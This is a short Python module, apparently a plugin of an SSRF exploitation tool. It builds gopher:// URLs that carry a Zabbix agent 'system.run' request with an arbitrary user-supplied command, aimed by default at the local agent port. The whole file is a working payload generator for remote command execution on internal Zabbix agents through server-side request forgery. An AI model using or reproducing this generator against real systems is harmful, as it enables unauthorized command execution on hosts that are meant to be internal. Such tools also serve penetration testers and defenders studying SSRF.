from urllib.parse import quote_plus

class Zabbix:
    def __init__(self, subparsers):
        parser = subparsers.add_parser("zabbix", help="zabbix exploitation")
        parser.add_argument("-t", "--target", help="Target", default="127.0.0.1:10050")
        parser.add_argument("-c", "--command", required=True, help="Command")
        parser.set_defaults(run=self.run)

    def encode(self, payload) -> str: 
        return quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

    def run(self, args) -> str:
        payload = f"system.run[({args.command});sleep 2s]"
        payload_encoded = self.encode(payload)

        print(f"gopher://{args.target}/_{payload_encoded}")